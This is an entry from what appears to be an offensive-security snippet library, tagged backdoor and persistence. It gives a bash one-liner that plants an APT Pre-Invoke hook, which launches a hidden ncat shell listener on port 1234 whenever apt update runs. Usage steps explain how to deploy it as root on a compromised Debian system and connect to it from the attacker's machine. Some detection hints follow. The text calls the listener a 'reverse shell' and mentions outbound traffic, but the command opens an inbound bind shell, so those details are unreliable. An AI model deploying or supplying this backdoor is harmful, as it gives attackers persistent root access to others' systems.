---
id: ba0043fd-058c-4c11-b1f8-d4f1524226fa
type: code
language: bash
verified: true
created_at: '2023-04-06T03:56:18.117260+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
platforms:
  - Linux
tags:
  - backdoor
  - persistence
  - apt
validated: true
---

# apt-backdoor-pre-invoke-config

## Code

```bash
echo 'APT::Update::Pre-Invoke {"nohup ncat -lvp 1234 -e /bin/bash 2> /dev/null &"};' > /etc/apt/apt.conf.d/42backdoor
```

## Description

This bash one-liner creates an APT configuration file that injects a Pre-Invoke hook to spawn a persistent ncat reverse shell listener on port 1234 before any apt update runs. It ensures the shell executes in the background with nohup for durability and suppresses errors for stealth.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| 1234 | Port for the ncat listener | 8080 |
| 42backdoor | Config filename (numbered for execution order) | 99backdoor |

## Usage

Execute as root on a compromised Debian-based Linux system to set up the backdoor. Trigger with `apt update` to activate. Connect from attacker machine using `ncat <target_ip> 1234`. Used in post-exploitation for conditional persistence tied to system updates.

## Detection

- File integrity checks on /etc/apt/apt.conf.d/* files revealing unexpected echo-written configs.
- Process monitoring for apt invoking ncat or unusual listeners on high ports.
- Network logs showing outbound connections from apt process.
- Audit logs for writes to APT config directories.

## Related

- [[Establish Persistence via Linux APT Backdoor]]
- [[tools/ncat]]
